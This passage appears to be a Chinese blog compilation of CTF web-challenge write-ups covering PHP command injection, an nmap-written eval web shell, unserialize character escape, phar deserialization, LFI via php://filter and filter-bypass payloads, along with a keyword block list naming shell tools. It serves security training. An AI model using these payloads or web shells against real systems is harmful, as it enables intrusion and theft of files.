strlen($str_long1) - 1), 1); &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#x27;num&#x27;]))&#123; if($_POST[&#x27;num&#x27;]===$str)&#123;x echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;; &#125; else&#123; echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;; &#125;&#125;show_source(&quot;check.php&quot;); 知道前10位了，我们可以使用php_mt_seed多个参数爆破种子 1234s=&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;pwd=&quot;Mu7S5Y076i&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 &quot;,end=&quot;&quot;) 找到种子，注意版本，只需用原来的加密方式就行 1234567891011&lt;?phpshow_source(__FILE__);mt_srand(666994457);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#x27;&#x27;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123; $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str.&quot;&lt;/p&gt;&quot;; 提交即可得flag [BUUCTF 2018]Online Toolwriteup访问得到源码： 1234567891011121314151617&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; escapeshellarg函数: escapeshellcmd函数： 这两个函数本身是没什么问题的，但是如果放在一起用，就可能造成漏洞 假设我们传入?host=127.0.0.1&#39;，以linux为例(Windows会不同)，未处理前 1127.0.0.1&#x27; 经过escapeshellarg函数，先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用： 1&#x27;127.0.0.1&#x27;\\&#x27;&#x27;&#x27; 经过escapeshellcmd函数，\\会被转义，最后一个&#39;由于不匹配也被转义： 1&#x27;127.0.0.1&#x27;\\\\&#x27;&#x27;\\&#x27; 此时执行的就是 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;127.0.0.1&#x27;\\\\&#x27;&#x27;\\&#x27; 相当于,成对的&#39;可以去掉掉，\\\\转义成\\，\\&#39;转义成&#39;，最终： 1nmap -T5 -sT -Pn --host-timeout 2 -F 127.0.0.1\\&#x27; 我们构造 1?host=&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27; 最终执行的就是 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\\\&#x27;&#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27;\\\\&#x27;&#x27;&#x27; 可以看到，由于空格的存在nmap把后面的都当作是一个个域名了，并成功的写入shell 我们再看一下其他的情况： 只用escapeshellarg函数，执行的命令： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27; 只用escapeshellcmd函数，执行的命令： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27; 先用escapeshellcmd函数后用escapeshellarg函数，执行的命令： 1nmap -T5 -sT -Pn --host-timeout 2 -F &#x27;&#x27;\\&#x27;&#x27; \\&lt;\\?php @eval\\(\\$_POST\\[1\\]\\)\\;\\?\\&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27; 这三种好像都无法注入命令 [0CTF 2016]piapiapiawriteup扫目录发现www.zip，在class.php看到过滤函数，输入已经不可能了 找了找发现profile.php中有个敏感函数 分析一下代码流程，用户登陆首先进入user类里的login()方法，在里面经过父类(mysql)filter方法的过滤，调用父类的select()方法,接着判断md5值是否相等，相等返回true，并把username存到session里 再看看update.php，虽然有上传但是没法解析成php，把填的信息序列化存到数据库里 接着再看profile.php这里调用了user类的show_profile()方法，同样经过过滤调用父类的select方法，把查询结果反序列化 由于filter进行了替换，很容易就想到了反序列化字符逃逸，看下怎末替换的 12345678910 public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125;# 把&#x27; \\\\ 替换成 _ 长度减一# 把select insert update delete where 替换成hacker where时长度加一 正常序列化： 123456&lt;?php$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1111111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] = &#x27;aaaa&#x27;;$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27;.md5(&#x27;str&#x27;);echo serialize($profile); 结果： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:17:&quot;1111111111@qq.com&quot;;s:8:&quot;nickname&quot;;s:4:&quot;aaaa&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload/341be97d9aff90c9978347f66f945b77&quot;;&#125; 我们发现最后一个不可控photo，而email和nickname可控，但有长度限制，很明显直接这样是逃逸不出去的 123456if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;);if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;);if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); 仔细看下，最后一个匹配和前面俩不一样，表示只要是非字母数字下划线都行，我们可以数组绕过这两个函数，两个函数都会返回false 这样序列化过程： 123456&lt;?php$profile[&#x27;phone&#x27;] = &#x27;11111111111&#x27;;$profile[&#x27;email&#x27;] = &#x27;1111111111@qq.com&#x27;;$profile[&#x27;nickname&#x27;] []= &#x27;aaaa&#x27;;$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27;.md5(&#x27;str&#x27;);echo serialize($profile); 结果： 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:17:&quot;1111111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;aaaa&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/341be97d9aff90c9978347f66f945b77&quot;;&#125; 接着我们就可以无限制的填充nickname了,让它溢出逃逸出去 我们需要添加的内容,长度m=35 1&quot;;&#125;s:5:&quot;photo&quot;;s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125; 列方程 15n+y+m&#x3D;6n+y 得n=35,即我们需要35个where，构造 注意数组的构造，然后就能得到读取文件base64的值 试着去读config.php,需要添加的内容 1&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 长度为34，故构造34个where，重新注册个账号就可以了 长度减小(\\\\替换成_)的方法没法用，因为我们后面没可控的字符 [安洵杯 2019]easy_webwriteup打开发现有img参数，第一时间想到文件包含，两次base64解密后16进制转ascii得到555.png 尝试/etc/passwd发现不行，看了下源码发现把除字母数字点号字符都替换为空了，思路要多点，不能局限一种 直接读index.php 1?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D; base64解密得到源码： 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; md5那里我们可以使用MD5碰撞，命令执行我们可以ca\\t /fl\\ag绕过 [网鼎杯 2020 青龙组]AreUSerialzwriteup源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 先看一下代码大体思路，首先判断反序列化字符串是否符合规则，符合则反序列化，首先进入__destruct()函数，首先判断$this-&gt;op参数的值，然后将$this-&gt;content设置为空，最后进入$this-&gt;process()，根据$this-&gt;op的值判断进行写还是读操作 很明显写文件已经不可能了，因为把文件内容设置为空了，所以看看读文件，可以看到__destruct()里判断$this-&gt;op用的是===，而 process()方法里的比较用的是==，我们可以用弱类型比较绕过: 123&quot;2&quot;==2&quot;2&quot;==&quot;2e0&quot;&quot;2&quot;==&quot; 2e0&quot; 最后就进入了$this-&gt;read()，但是由于各参数都是protected类型，生成的字符串有\\x00,所以无法pass is_valid函数，php7.1+版本对属性类型不敏感，所以直接用public绕过，或者将s替换成S，并把\\x00替换成\\00，原理可以参见： https://github.com/ambionics/phpggc 构造exp，F12得到flag: 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclass FileHandler &#123; public $op; public $filename; public $content;&#125;$a = new FileHandler();$a-&gt;op = 2;$a-&gt;filename = &quot;flag.php&quot;;$a-&gt;content = &quot;Hello World!&quot;;echo serialize($a);?&gt; &lt;?phpclass FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $this-&gt;op = 2; $this-&gt;filename = &quot;flag.php&quot;; $this-&gt;content = &quot;Hello World!&quot;; &#125;&#125;$a = new FileHandler();$s = serialize($a);$s = str_replace(chr(0),&#x27;\\00&#x27;,$s);$s = str_replace(&#x27;s:&#x27;,&#x27;S:&#x27;,$s);echo $s;// O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\\00*\\00op&quot;;i:2;S:11:&quot;\\00*\\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\\00*\\00content&quot;;S:12:&quot;Hello World!&quot;;&#125;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;&#125;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:12:&quot;Hello World!&quot;;// O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:13:&quot;Hello World!&quot;;&#125; 上面四个payload都能读到flag [安洵杯 2019]easy_serialize_phpwriteup源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; phpinfo中看到auto_append_file为d0g3_f1ag.php 正常序列化 123456789101112 &lt;?php function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125; $_SESSION[&quot;user&quot;] = &#x27;guest&#x27;; $_SESSION[&#x27;function&#x27;] = &#x27;show_image&#x27;; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;); echo serialize($_SESSION);// a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:10:&quot;show_image&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 需要添加的字符串 长度为27： 1;s:3:&quot;img&quot;;s:8:&quot;L2ZsYWc&#x3D;&quot;;&#125; 那么要吃掉的字符串长度为17 1&quot;;s:3:&quot;aaa&quot;;s:27: 这样不太行 数组中参数个数必须相同 尝试构造需要添加的字符串 1;s:3:&quot;img&quot;;s:8:&quot;L2ZsYWc&#x3D;&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125; 需要吃掉的字符串和之前长度一样 payload: 123?f&#x3D;show_imagePOST: _SESSION[user]&#x3D;phpphpphpflagflag&amp;_SESSION[aaa]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125; 得到flag在/d0g3_fllllllag 读flag payload: 123?f&#x3D;show_imagePOST: _SESSION[user]&#x3D;phpphpphpflagflag&amp;_SESSION[aaa]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;a&quot;;s:1:&quot;a&quot;;&#125; [BSidesCF 2020]Had a bad daywriteup文件包含 发现有flag.php 尝试伪协议读源码 index.php 12345678910111213&lt;?php$file = $_GET[&#x27;category&#x27;];if(isset($file))&#123;if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;);&#125;else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;;&#125;&#125;?&gt; 只是判断字符串是否有关键字符 伪协议读flag.php payload: 1?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index&#x2F;..&#x2F;flag [WUSTCTF2020]朴实无华writeup访问robots.txt发现fAke_f1agggg.php 访问在http响应头找到/fl4g.php 访问得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;金钱解决不了穷人的本质问题&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;快到非洲了&quot;); &#125;&#125;else&#123; die(&quot;去非洲吧&quot;);&#125;?&gt; payload: 1fl4g.php?num&#x3D;202e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;tac$&#123;IFS&#125;* 参考： https://www.cnblogs.com/Cl0ud/p/12187204.html [CISCN2019 华北赛区 Day1 Web1]Dropboxwriteup注册 登陆 随便上传个文件 抓包 任意文件读取 upload.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;include &quot;class.php&quot;;if (isset($_FILES[&quot;file&quot;])) &#123; $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = &quot;.gif&quot;; switch ($_FILES[&quot;file&quot;][&quot;type&quot;]) &#123; case &#x27;image/gif&#x27;: $fileext = &quot;.gif&quot;; break; case &#x27;image/jpeg&#x27;: $fileext = &quot;.jpg&quot;; break; case &#x27;image/png&#x27;: $fileext = &quot;.png&quot;; break; default: $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Only gif/jpg/png allowed&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION[&#x27;sandbox&#x27;] . $filename . $fileext; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $dst); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125; else &#123; $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;Invaild filename&quot;); Header(&quot;Content-type: application/json&quot;); echo json_encode($response); &#125;&#125;?&gt; 上传应该没办法绕过了 继续读取其它文件 class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . &quot;SiAchGHmFx&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key = array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(&#x27; B&#x27;, &#x27; KB&#x27;, &#x27; MB&#x27;, &#x27; GB&#x27;, &#x27; TB&#x27;); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION[&#x27;login&#x27;])) &#123; header(&quot;Location: login.php&quot;); die();&#125;if (!isset($_POST[&#x27;filename&#x27;])) &#123; die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#x27;sandbox&#x27;]);$file = new File();$filename = (string) $_POST[&#x27;filename&#x27;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;); echo json_encode($response);&#125; else &#123; Header(&quot;Content-type: application/json&quot;); $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;); echo json_encode($response);&#125;?&gt; 这莫多类 又有文件上传 phar反序列化没跑了 先看下触发phar反序列化的地方 即文件删除的时候 先 1$file-&gt;open($filename) open方法相当于构造方法 12345678public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125;&#125; 通过file_exists函数的时候就触发反序列化了 搜索__destruct有两处 很容易构造出一个任意文件读取的链 但是没有回显 这里就需要利用FileList类中的__destruct方法和__call方法了 这里的__destruct将$this-&gt;results的信息都输出了 因此我们只需调用__call方法将读取到的值存在$this-&gt;results就行 poc: 1234567891011121314151617181920212223242526272829303132&lt;?phpclass User &#123; public $db; public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class File &#123; public $filename; public function __construct() &#123; $this-&gt;filename = &#x27;/flag.txt&#x27;; &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct() &#123; $this-&gt;files = [new File()]; &#125;&#125;$phar = new Phar(&quot;aaa.phar&quot;); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$object = new User;$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;a.txt&quot;, &quot;a&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); [CISCN2019 总决赛 Day2 Web1]Easywebwriteup扫目录发现 robots.txt 12User-agent: *Disallow: *.php.bak image.php.bak 123456789101112131415161718&lt; 